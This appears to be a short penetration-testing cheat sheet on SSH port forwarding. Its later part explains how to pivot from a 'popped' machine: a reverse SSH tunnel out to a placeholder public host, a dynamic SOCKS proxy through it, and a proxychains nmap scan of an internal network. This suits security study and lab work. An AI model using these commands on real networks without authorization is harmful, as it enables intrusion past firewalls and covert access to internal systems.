### Remote Forwarding
* Let remote view the client's http (80) server on their localhost 8080
 
    ssh -R 8080:localhost:80 remote@host

### Local Forwarding
* Tunnels local traffic through ssh tunnel (bypass firewalled 5901)
  
    ssh -L 5901:localhost:5901 remote@host

### Port forwarding
-   SSH Local Port Forwarding: supports bi-directional communication
    channels

    -   `ssh <gateway> -L <local port to listen>:<remote host>:<remote port>`

-   SSH Remote Port Forwarding: Suitable for popping a remote shell on
    an internal non routable network

    -   `ssh <gateway> -R <remote port to bind>:<local host>:<local port>` 

-   SSH Dynamic Port Forwarding: create a SOCKS4 proxy on our local
    attacking box to tunnel ALL incoming traffic to ANY host in the DMZ
    network on ANY PORT

    -   `ssh -D <local proxy port> -p <remote port> <target>`

-   Proxychains - Perform nmap scan within a DMZ from an external
    computer

    -   Create reverse SSH tunnel from Popped machine on :2222  
        
        `ssh -f -N -T -R22222:localhost:22 yourpublichost.example.com`
        `ssh -f -N -R 2222:<local host>:22 root@<remote host>`

    -   Create a Dynamic application-level port forward on 8080 thru
        2222  
        
        `ssh -f -N -D <local host>:8080 -p 2222 hax0r@<remote host>`
  
      -   Leverage the SSH SOCKS server to perform Nmap scan on network
        using proxy chains  
        
        `proxychains nmap --top-ports=20 -sT -Pn $ip/24`

